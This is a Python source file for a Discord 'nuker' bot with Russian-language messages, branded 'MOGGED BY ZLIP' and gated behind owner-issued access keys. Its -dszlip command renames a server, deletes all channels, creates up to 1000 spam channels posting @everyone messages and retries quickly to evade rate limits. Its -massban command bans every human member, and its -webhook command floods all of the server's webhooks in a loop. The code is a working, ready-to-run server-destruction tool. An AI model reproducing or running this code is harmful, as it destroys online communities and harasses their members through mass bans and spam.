import discord
from discord.ext import commands
import asyncio
import time
import os
import json
import aiohttp
from datetime import datetime

bot = commands.Bot(command_prefix='-', intents=discord.Intents.all(), help_command=None)

channel_counter = 0
start_time = 0
rate_limit_hits = 0
webhook_spam_active = False

OWNER_ID = 1448196738308509739

keys_db = "keys.json"

def load_keys():
    try:
        with open(keys_db, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(keys_db, "w") as f:
        json.dump(keys, f)

keys_data = load_keys()

def is_owner(ctx):
    return ctx.author.id == OWNER_ID

def has_valid_key(user_id):
    user_id = str(user_id)
    if user_id in keys_data and keys_data[user_id] == "activated":
        return True
    return False

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')
    print(f'🌐 Запущен на {len(bot.guilds)} серверах')
    print(f'👑 Владелец: {OWNER_ID}')
    
    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Game(name="-help")
    )

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send(f"❌ Ошибка: {error}")

# === ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА ===
@bot.command()
async def admin(ctx):
    if not is_owner(ctx):
        return
    
    embed = discord.Embed(
        title="👑 АДМИН ПАНЕЛЬ",
        description="Управление ботом",
        color=discord.Color.dark_grey()
    )
    embed.add_field(name="-genkey @user/ID", value="Выдать ключ", inline=False)
    embed.add_field(name="-keys", value="Список ключей", inline=False)
    embed.add_field(name="-delkey @user/ID", value="Удалить ключ", inline=False)
    embed.add_field(name="-servers", value="Список серверов", inline=False)
    embed.add_field(name="-send текст", value="Рассылка", inline=False)
    embed.set_footer(text="MOGGED BY ZLIP")
    await ctx.send(embed=embed)

@bot.command()
async def genkey(ctx, arg = None):
    if not is_owner(ctx):
        return
    
    if not arg:
        await ctx.send("❌ Укажи пользователя или ID: -genkey @user или -genkey 123456789")
        return
    
    user_id = None
    user_name = "Неизвестный"
    
    try:
        if arg.startswith('<@') and arg.endswith('>'):
            user_id = arg.replace('<@', '').replace('>', '').replace('!', '')
        else:
            user_id = int(arg)
    except:
        await ctx.send("❌ Неверный формат. Используй @user или ID")
        return
    
    user_id = str(user_id)
    
    try:
        user = await bot.fetch_user(int(user_id))
        user_name = user.name
    except:
        user_name = f"Пользователь {user_id}"
    
    keys_data[user_id] = "activated"
    save_keys(keys_data)
    
    embed = discord.Embed(
        title="✅ КЛЮЧ ВЫДАН",
        description=f"Пользователь {user_name} получил доступ",
        color=discord.Color.green()
    )
    embed.add_field(name="ID", value=user_id, inline=False)
    embed.add_field(name="Статус", value="Активирован", inline=False)
    await ctx.send(embed=embed)
    
    try:
        user = await bot.fetch_user(int(user_id))
        await user.send(f"🔥 Ты получил доступ к боту!\nИспользуй `-dszlip`")
    except:
        await ctx.send(f"⚠️ Не удалось отправить в личку")

@bot.command()
async def keys(ctx):
    if not is_owner(ctx):
        return
    
    if not keys_data:
        await ctx.send("📭 Нет активированных ключей")
        return
    
    users = ""
    for uid, status in keys_data.items():
        try:
            user = await bot.fetch_user(int(uid))
            users += f"- {user.name} (ID: {uid}) - {status}\n"
        except:
            users += f"- {uid} - {status}\n"
    
    embed = discord.Embed(
        title="🔑 АКТИВНЫЕ КЛЮЧИ",
        description=users,
        color=discord.Color.dark_grey()
    )
    embed.set_footer(text=f"Всего: {len(keys_data)}")
    await ctx.send(embed=embed)

@bot.command()
async def delkey(ctx, arg = None):
    if not is_owner(ctx):
        return
    
    if not arg:
        await ctx.send("❌ Укажи пользователя или ID: -delkey @user или -delkey 123456789")
        return
    
    user_id = None
    
    try:
        if arg.startswith('<@') and arg.endswith('>'):
            user_id = arg.replace('<@', '').replace('>', '').replace('!', '')
        else:
            user_id = int(arg)
    except:
        await ctx.send("❌ Неверный формат")
        return
    
    user_id = str(user_id)
    
    try:
        user = await bot.fetch_user(int(user_id))
        user_name = user.name
    except:
        user_name = f"Пользователь {user_id}"
    
    if user_id in keys_data:
        del keys_data[user_id]
        save_keys(keys_data)
        await ctx.send(f"✅ Ключ у {user_name} удален")
    else:
        await ctx.send(f"❌ У {user_name} нет ключа")

@bot.command()
async def send(ctx, *, message):
    if not is_owner(ctx):
        return
    
    await ctx.send(f"📡 Рассылка началась...")
    
    sent = 0
    for guild in bot.guilds:
        try:
            channel = guild.system_channel or guild.text_channels[0]
            await channel.send(f"📢 **ОБЪЯВЛЕНИЕ**\n{message}")
            sent += 1
            await asyncio.sleep(0.5)
        except:
            pass
    
    await ctx.send(f"✅ Отправлено на {sent} серверов")

@bot.command()
async def servers(ctx):
    if not is_owner(ctx):
        return
    
    server_list = ""
    for i, guild in enumerate(bot.guilds):
        server_list += f"{i+1}. {guild.name} (ID: {guild.id}) - {len(guild.members)} участников\n"
    
    if len(server_list) > 1900:
        with open("servers.txt", "w", encoding="utf-8") as f:
            f.write(server_list)
        await ctx.send(file=discord.File("servers.txt"))
        os.remove("servers.txt")
    else:
        await ctx.send(f"📊 Серверы бота:\n```{server_list}```")

# === КОМАНДЫ ДЛЯ ПОЛЬЗОВАТЕЛЕЙ ===
@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="📋 СПИСОК КОМАНД",
        description="Все доступные команды",
        color=discord.Color.dark_grey()
    )
    embed.add_field(name="━━━━ ❗ ОСНОВНЫЕ ❗ ━━━━", value="", inline=False)
    embed.add_field(name="-dszlip", value="Запускает процесс", inline=False)
    embed.add_field(name="-status", value="Показывает статус бота", inline=False)
    embed.add_field(name="-ping", value="Проверка задержки", inline=False)
    embed.add_field(name="-webhook", value="Активирует вебхуки", inline=False)
    embed.add_field(name="-massban", value="Массовый бан", inline=False)
    embed.set_footer(text="MOGGED BY ZLIP")
    await ctx.send(embed=embed)

@bot.command()
async def ping(ctx):
    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
        await ctx.send("❌ У тебя нет доступа!")
        return
    
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Понг! Задержка: {latency}мс")

@bot.command()
async def status(ctx):
    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
        await ctx.send("❌ У тебя нет доступа!")
        return
    
    embed = discord.Embed(
        title="📊 СТАТУС БОТА",
        color=discord.Color.dark_grey()
    )
    embed.add_field(name="Бот", value=bot.user.name, inline=True)
    embed.add_field(name="Серверов", value=len(bot.guilds), inline=True)
    embed.add_field(name="Пинг", value=f"{round(bot.latency * 1000)}мс", inline=True)
    embed.set_footer(text="MOGGED BY ZLIP")
    await ctx.send(embed=embed)

@bot.command()
async def webhook(ctx):
    global webhook_spam_active
    
    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
        await ctx.send("❌ У тебя нет доступа!")
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нужны права администратора!")
        return
    
    webhook_spam_active = not webhook_spam_active
    
    if webhook_spam_active:
        await ctx.send("🌐 Вебхуки АКТИВИРОВАНЫ")
        
        webhook_urls = []
        for channel in ctx.guild.text_channels:
            try:
                webhooks = await channel.webhooks()
                for webhook in webhooks:
                    webhook_urls.append(webhook.url)
            except:
                pass
        
        if not webhook_urls:
            await ctx.send("❌ На сервере нет вебхуков!")
            webhook_spam_active = False
            return
        
        spam_text = "@everyone\n**MOGGED BY ZLIP**\nhttps://guns.lol/dszlip"
        
        async def spam_webhooks():
            while webhook_spam_active:
                for url in webhook_urls:
                    try:
                        async with aiohttp.ClientSession() as session:
                            data = {"content": spam_text}
                            await session.post(url, json=data)
                    except:
                        pass
                await asyncio.sleep(0.1)
        
        bot.loop.create_task(spam_webhooks())
    else:
        await ctx.send("🛑 Вебхуки ОСТАНОВЛЕНЫ")

@bot.command()
async def massban(ctx):
    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
        await ctx.send("❌ У тебя нет доступа!")
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нужны права администратора!")
        return
    
    await ctx.send("⚠️ МАССОВЫЙ БАН...")
    
    banned = 0
    for member in ctx.guild.members:
        if not member.bot:
            try:
                await member.ban(reason="MOGGED BY ZLIP")
                banned += 1
            except:
                pass
            await asyncio.sleep(0.01)
    
    await ctx.send(f"✅ Забанено: {banned} участников")

@bot.command()
async def dszlip(ctx):
    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
        await ctx.send("❌ У тебя нет доступа!")
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нужны права администратора!")
        return
    
    await ctx.send("**ZLIP EBET**")
    
    global channel_counter, start_time, rate_limit_hits
    channel_counter = 0
    start_time = time.time()
    rate_limit_hits = 0
    
    guild = ctx.guild
    
    async def create_roles():
        for i in range(50):
            try:
                await guild.create_role(name=f"ZLIP-{i+1}")
            except:
                break
            await asyncio.sleep(0.01)
    
    await guild.edit(name="MOGGED BY ZLIP")
    await create_roles()
    print("✅ Название и роли изменены")
    
    print("🗑️ УДАЛЕНИЕ КАНАЛОВ...")
    
    deleted = 0
    skipped = 0
    channels = list(guild.channels)
    total = len(channels)
    
    async def delete_single_channel(channel):
        try:
            await channel.delete()
            return True
        except:
            return False
    
    batch_size = 200
    for i in range(0, total, batch_size):
        batch = channels[i:i+batch_size]
        tasks = [delete_single_channel(ch) for ch in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                deleted += 1
            else:
                skipped += 1
        
        if (i + batch_size) % 400 == 0:
            print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
    
    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
    
    print("🔥 МАКСИМАЛЬНО ЖЕСТКОЕ СОЗДАНИЕ КАНАЛОВ...")
    
    SPAM_TEXT = """@everyone
**MOGGED BY ZLIP**

https://guns.lol/dszlip

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ZLIP
"""
    
    created = 0
    failed = 0
    target_channels = 1000
    
    async def create_single_channel(i):
        global channel_counter, rate_limit_hits
        
        try:
            ch = await guild.create_text_channel(f"zlip-nuked-{i+1}")
            
            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
            await asyncio.gather(*messages)
            
            channel_counter += 1
            
            if channel_counter % 10 == 0:
                elapsed = time.time() - start_time
                speed = channel_counter / elapsed if elapsed > 0 else 0
                print(f"📊 [{channel_counter}] {speed:.1f}/сек")
            
            return True
            
        except discord.Forbidden:
            return False
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                rate_limit_hits += 1
                wait_time = min(rate_limit_hits * 0.001, 0.005)
                await asyncio.sleep(wait_time)
                return await create_single_channel(i)
            else:
                return False
        except Exception as e:
            return False
    
    batch_size = 100
    max_batches = target_channels // batch_size + 1
    
    for batch_num in range(max_batches):
        tasks = []
        for j in range(batch_size):
            i = batch_num * batch_size + j
            if i >= target_channels:
                break
            tasks.append(create_single_channel(i))
        
        if not tasks:
            break
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                created += 1
            else:
                failed += 1
        
        if created >= target_channels:
            print(f"✅ Достигнута цель: {created} каналов")
            break
        
        if created % 50 == 0 and created > 0:
            elapsed = time.time() - start_time
            speed = created / elapsed if elapsed > 0 else 0
            print(f"📊 ПРОГРЕСС: {created}/{target_channels} ({speed:.1f}/сек)")
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {created}")
    print(f"✅ Сообщений отправлено: {created * 5}")
    print(f"❌ Ошибок: {failed}")
    print(f"⏱️ Время: {time.time() - start_time:.1f} сек")
    print(f"📊 Скорость: {created / (time.time() - start_time):.1f} каналов/сек")
    print("="*50)
    
    try:
        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}")
    except:
        pass

import os
bot.run(os.environ['TOKEN'])
